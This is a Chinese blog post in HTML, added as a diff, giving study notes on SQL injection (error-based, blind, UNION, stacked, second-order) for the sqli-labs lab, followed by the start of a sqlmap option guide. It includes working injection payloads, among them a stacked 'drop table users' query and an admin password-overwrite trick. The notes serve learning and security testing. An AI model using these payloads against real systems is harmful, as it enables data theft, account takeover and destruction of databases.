@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-flash.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hasegawaazusa.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="有关sql注入的简要笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入笔记">
+<meta property="og:url" content="https://hasegawaazusa.github.io/sql-inject-note.html">
+<meta property="og:site_name" content="独奏の小屋">
+<meta property="og:description" content="有关sql注入的简要笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-08-07T14:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-24T12:12:00.033Z">
+<meta property="article:author" content="qsdz">
+<meta property="article:tag" content="note">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://hasegawaazusa.github.io/sql-inject-note.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hasegawaazusa.github.io/sql-inject-note.html","path":"/sql-inject-note.html","title":"sql注入笔记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>sql注入笔记 | 独奏の小屋</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">独奏の小屋</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">65</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">129</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">SQL 注入基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">基于错误的注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E5%80%BC%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.2.</span> <span class="nav-text">基于布尔值的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.3.</span> <span class="nav-text">基于时间的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-union-%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.</span> <span class="nav-text">基于 UNION 查询的注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.5.</span> <span class="nav-text">堆叠查询注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0%E6%8F%92%E5%85%A5%E5%92%8C%E5%88%A0%E9%99%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">1.6.</span> <span class="nav-text">更新、插入和删除注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.7.</span> <span class="nav-text">二次注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap"><span class="nav-number">2.</span> <span class="nav-text">sqlmap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">2.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD"><span class="nav-number">2.2.</span> <span class="nav-text">功能</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87"><span class="nav-number">2.2.1.</span> <span class="nav-text">目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82"><span class="nav-number">2.2.2.</span> <span class="nav-text">请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%98%E5%8C%96"><span class="nav-number">2.2.3.</span> <span class="nav-text">优化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.4.</span> <span class="nav-text">注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B"><span class="nav-number">2.2.5.</span> <span class="nav-text">检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%80%E6%9C%AF"><span class="nav-number">2.2.6.</span> <span class="nav-text">技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E7%BA%B9"><span class="nav-number">2.2.7.</span> <span class="nav-text">指纹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">2.2.8.</span> <span class="nav-text">枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4"><span class="nav-number">2.2.9.</span> <span class="nav-text">爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="nav-number">2.2.10.</span> <span class="nav-text">任意文件读写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.2.11.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%AE%BF%E9%97%AE"><span class="nav-number">2.2.12.</span> <span class="nav-text">注册表访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E9%80%89%E9%A1%B9"><span class="nav-number">2.2.13.</span> <span class="nav-text">常规选项</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqli-labs"><span class="nav-number">2.3.</span> <span class="nav-text">sqli-labs</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#less-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-3"><span class="nav-number">2.3.3.</span> <span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-4"><span class="nav-number">2.3.4.</span> <span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-5"><span class="nav-number">2.3.5.</span> <span class="nav-text">Less-5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-6"><span class="nav-number">2.3.6.</span> <span class="nav-text">Less-6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-7"><span class="nav-number">2.3.7.</span> <span class="nav-text">Less-7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-8"><span class="nav-number">2.3.8.</span> <span class="nav-text">Less-8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-9"><span class="nav-number">2.3.9.</span> <span class="nav-text">Less-9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-10"><span class="nav-number">2.3.10.</span> <span class="nav-text">Less-10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-11"><span class="nav-number">2.3.11.</span> <span class="nav-text">Less-11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-12"><span class="nav-number">2.3.12.</span> <span class="nav-text">Less-12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-13"><span class="nav-number">2.3.13.</span> <span class="nav-text">Less-13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-14"><span class="nav-number">2.3.14.</span> <span class="nav-text">Less-14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-15"><span class="nav-number">2.3.15.</span> <span class="nav-text">Less-15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-16"><span class="nav-number">2.3.16.</span> <span class="nav-text">Less-16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-17"><span class="nav-number">2.3.17.</span> <span class="nav-text">Less-17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-18"><span class="nav-number">2.3.18.</span> <span class="nav-text">Less-18</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-19"><span class="nav-number">2.3.19.</span> <span class="nav-text">Less-19</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-20"><span class="nav-number">2.3.20.</span> <span class="nav-text">Less-20</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-21"><span class="nav-number">2.3.21.</span> <span class="nav-text">Less-21</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-22"><span class="nav-number">2.3.22.</span> <span class="nav-text">Less-22</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-23"><span class="nav-number">2.3.23.</span> <span class="nav-text">Less-23</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-24"><span class="nav-number">2.3.24.</span> <span class="nav-text">Less-24</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-25"><span class="nav-number">2.3.25.</span> <span class="nav-text">Less-25</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-25a"><span class="nav-number">2.3.26.</span> <span class="nav-text">Less-25a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-26"><span class="nav-number">2.3.27.</span> <span class="nav-text">Less-26</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-26a"><span class="nav-number">2.3.28.</span> <span class="nav-text">Less-26a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-27"><span class="nav-number">2.3.29.</span> <span class="nav-text">Less-27</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-27a"><span class="nav-number">2.3.30.</span> <span class="nav-text">Less-27a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-28"><span class="nav-number">2.3.31.</span> <span class="nav-text">Less-28</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-28a"><span class="nav-number">2.3.32.</span> <span class="nav-text">Less-28a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-29"><span class="nav-number">2.3.33.</span> <span class="nav-text">Less-29</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-30"><span class="nav-number">2.3.34.</span> <span class="nav-text">Less-30</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-31"><span class="nav-number">2.3.35.</span> <span class="nav-text">Less-31</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-32"><span class="nav-number">2.3.36.</span> <span class="nav-text">Less-32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-33"><span class="nav-number">2.3.37.</span> <span class="nav-text">Less-33</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-34"><span class="nav-number">2.3.38.</span> <span class="nav-text">Less-34</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-35"><span class="nav-number">2.3.39.</span> <span class="nav-text">Less-35</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-36"><span class="nav-number">2.3.40.</span> <span class="nav-text">Less-36</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-37"><span class="nav-number">2.3.41.</span> <span class="nav-text">Less-37</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BD%AF%E4%BB%B6%E7%89%B9%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">数据库软件特点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql"><span class="nav-number">3.1.</span> <span class="nav-text">MySQL</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="qsdz"
+      src="/images/android-chrome-144x144.png">
+  <p class="site-author-name" itemprop="name">qsdz</p>
+  <div class="site-description" itemprop="description">又菜又爱玩，望轻喷</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">129</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/HasegawaAzusa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HasegawaAzusa" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hasegawaazusa.github.io/sql-inject-note.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/android-chrome-144x144.png">
+      <meta itemprop="name" content="qsdz">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="独奏の小屋">
+      <meta itemprop="description" content="又菜又爱玩，望轻喷">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="sql注入笔记 | 独奏の小屋">
+      <meta itemprop="description" content="有关sql注入的简要笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入笔记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-08-07 22:00:00" itemprop="dateCreated datePublished" datetime="2022-08-07T22:00:00+08:00">2022-08-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-03-24 20:12:00" itemprop="dateModified" datetime="2024-03-24T20:12:00+08:00">2024-03-24</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>29k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>27 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">有关sql注入的简要笔记</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <blockquote>
+<p>暂时还在更新，博主比较懒，请提醒它及时完成 sqli-labs</p>
+</blockquote>
+<h1 id="sql-注入基础">SQL 注入基础</h1>
+<h2 id="基于错误的注入">基于错误的注入</h2>
+<p>基于错误的注入，或者说基于报错的注入，是指通过构造特定的 SQL
+语句使得数据库软件执行错误，随后服务端将错误反馈到用户端以暴露出<strong>特定信息</strong>的攻击方式。</p>
+<p>一种情况是通过构造错误的参数，使得一些 SQL
+语句的错误直接回显在页面上，暴露一些 SQL
+语句信息便于使用特定的攻击手段；</p>
+<p>另一种情况是后台没有对一些具有报错功能的函数进行过滤，使得一些关键信息被直接被以报错的形式携带到页面上。</p>
+<p>二者的前提都<strong>基于 WEB
+应用程序未关闭数据库的报错函数</strong>。</p>
+<p>比如说在 sqli-labs 的 Less-1
+中，通过单引号引起报错，得到类似的错误回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>暴露出大致 SQL 查询语句可能为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>便于构造特定的攻击参数。</p>
+<p>又或者是通过特定函数，比如说通过双查询的方式引起某个函数报错，使得错误回显携带关键信息，比如说参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; AND (SELECT 1 FROM (SELECT count(*) ,concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --+</span><br></pre></td></tr></table></figure>
+<p>通过 <code>floor(rand(0)*2))</code> 语句使得键按 010 的方式生成，导致
+<code>GROUP BY</code> 查询到重复的键引发报错，回显为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &#x27;::security::1&#x27; for key &#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<p>这样就将我们想要的 <code>database()</code> 的值携带出来了。</p>
+<h2 id="基于布尔值的盲注">基于布尔值的盲注</h2>
+<p>但有时页面不一定会发生数据上的改变，比如说登陆页面，在查询账户密码进行比对后，页面只会有登陆成功和登陆错误（布尔值的真与假）两种变化，从而没办法直接获取到数据本身。</p>
+<p>这个时候我们可以通过构造表达式完成注入，例如将语句构造成仅当布尔值成立时，查询才会有结果，从而使得页面回显为真，通过多次注入，最终<strong>间接</strong>获取到目标数据。</p>
+<p>例如可以构造参数
+<code>1' AND length(database())=1 --+</code>，通过不断改变比较的数字，来猜测数据库名的长度。</p>
+<h2 id="基于时间的盲注">基于时间的盲注</h2>
+<p>有时页面完全没有变化，又或者是页面为 SQL
+语句加入了一些过滤导致其他注入方式无法成功时，就可以考虑时间盲注。</p>
+<p>基于布尔值盲注的原理，我们将布尔值的变化从用户端页面的变化转移到服务端时间的变化，这就是时间盲注原理。</p>
+<p>最常用的方式就是在 SQL 语句中注入 <code>sleep</code>
+函数，在布尔值为真时使得服务端 IO
+时间增加到异常的情况（我们可以判断的情况，例如延时 5
+秒），这样就完成了一次时间盲注。</p>
+<p>例如可以构造参数
+<code>1' AND if(length(database())=1,sleep(5),1) --+</code>，通过不断改变比较的数字，来猜测数据库名的长度。</p>
+<h2 id="基于-union-查询的注入">基于 <code>UNION</code> 查询的注入</h2>
+<p><code>UNION</code> 查询注入，也称为联合查询注入，是一种常见的 SQL
+注入技术。它利用了 SQL 中 <code>UNION</code>
+关键字的特性，允许合并两个或多个 <code>SELECT</code>
+查询的结果，并将它们作为单个结果返回。</p>
+<p>举例来说，在一个查看所有用户的界面中，通常会对 <code>users</code>
+表执行查询并返回结果。攻击者可以通过在原始查询中注入恶意的
+<code>UNION</code>
+语句，将其他表的查询结果合并到原始结果中。这样，攻击者就可以越权查询其他表的数据，从而获取敏感信息或执行其他恶意操作。</p>
+<p>例如说参数
+<code>1' UNION SELECT user(),database() --+</code>，我们就可以在回显中查看到用户名和数据库名。</p>
+<h2 id="堆叠查询注入">堆叠查询注入</h2>
+<p>堆叠查询可以同时执行多条 SQL 查询语句，通过注入恶意的 SQL
+查询来实现对数据库的控制。</p>
+<p>同时堆叠查询也被称为 <strong>piggy
+backing</strong>，是因为堆叠查询的恶意语句是直接<strong>搭载</strong>在正常查询内容之后的。</p>
+<p>堆叠查询的核心在于不一定需要改变原查询语句来构建复杂的参数，因为常常我们的输入是有长度限制的（例如用户名的长度限制），通过堆叠查询的方式可以减轻参数的复杂程度，一般配合其他注入方式使用。</p>
+<p>例如说一个攻击参数
+<code>1;drop table users; --+</code>，这样直接破坏了原有的数据库结构，使得服务无法正常进行。</p>
+<h2 id="更新插入和删除注入">更新、插入和删除注入</h2>
+<p>有时 <code>SELECT</code> 语句会被限制使用，那么此时可以利用
+<code>UPDATE</code> 语句、<code>INSERT</code>
+语句、<code>DELETE</code>语句、<code>updatexml()</code>
+函数等操作完成数据修改的注入。</p>
+<p>比如说通过 <code>UPDATE</code> 语句修改管理员权限账户的密码，利用
+<code>INSERT</code>
+注入一个新的带有管理员权限的账户，又或者可以利用这些语句同样拥有的查询功能来联合其他的注入手段。</p>
+<h2 id="二次注入">二次注入</h2>
+<p>攻击者将构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL
+查询语句所导致的注入被称为二次注入。</p>
+<p>例如说在修改用户名的页面将用户名编辑为恶意数据，例如说
+<code>admin' #</code>，那么在修改密码界面，可能的 SQL 语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;$new_pass&#x27;</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$user&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;$old_pass&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>此时服务端获取到 <code>admin' #</code> 插入到 SQL 语句中，导致 SQL
+语句变为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;$new_pass&#x27;</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> # <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;$old_pass&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>使得我们成功注入修改了 <code>admin</code> 管理用户的密码。</p>
+<p>在这里相当于我们将一句话注入拆分成了两步，先给<strong>变量</strong>赋值，然后再将<strong>变量</strong>注入到
+SQL 语句中。</p>
+<p>这样即使后端对用户输入做了转义，但是没有考虑到服务端数据会被二次利用，也能够进行注入。</p>
+<h1 id="sqlmap">sqlmap</h1>
+<h2 id="简介">简介</h2>
+<p>sqlmap 是一个强大的开源渗透测试工具，可以自动执行检测和利用 SQL
+注入缺陷以及接管数据库服务器的过程。它配备了强大的检测引擎、终极渗透测试仪的许多利基功能以及广泛的开关，包括数据库指纹、从数据库获取数据、访问底层文件系统以及通过输出在操作系统上执行命令和外带连接等。</p>
+<p>sqlmap 能够监测和利用多种不同的 SQL
+注入类型，包括盲注、错误注入、堆叠注入等，同时还支持通过参数精细化注入，使得其适用于各种各样的场景。</p>
+<h2 id="功能">功能</h2>
+<p>通过 <code>sqlmap -h</code> 可以查看简要帮助，而
+<code>sqlmap -hh</code> 可以查看详细帮助。</p>
+<p>通过 <code>-v</code> 参数可以改变 sqlmap 的信息输出详细等级，默认为
+1。</p>
+<ul>
+<li><strong>0</strong>：仅显示 Python
+回溯、错误和关键消息。<code>-v 0</code></li>
+<li><strong>1</strong>：还显示信息和警告消息。<code>-v 1</code></li>
+<li><strong>2</strong>：还显示调试消息。<code>-v</code></li>
+<li><strong>3</strong>：还显示注入的有效负载。<code>-vv</code></li>
+<li><strong>4</strong>：还显示 HTTP 请求。<code>-vvv</code></li>
+<li><strong>5</strong>：还显示 HTTP 响应的标头。<code>-vvvv</code></li>
+<li><strong>6</strong> : 还显示 HTTP
+响应的页面内容。<code>-vvvvv</code></li>
+</ul>
+<h3 id="目标">目标</h3>
+<p>sqlmap 支持单个或多个自动化渗透目标，是必须指定的参数。</p>
+<p><code>-u</code> 必须是可以访问的 URL 网络地址，形式为
+<code>http(s)://targeturl[:port]/[...]</code>，一般来说还需要携带 GET
+参数便于 sqlmap 自动化解析。</p>
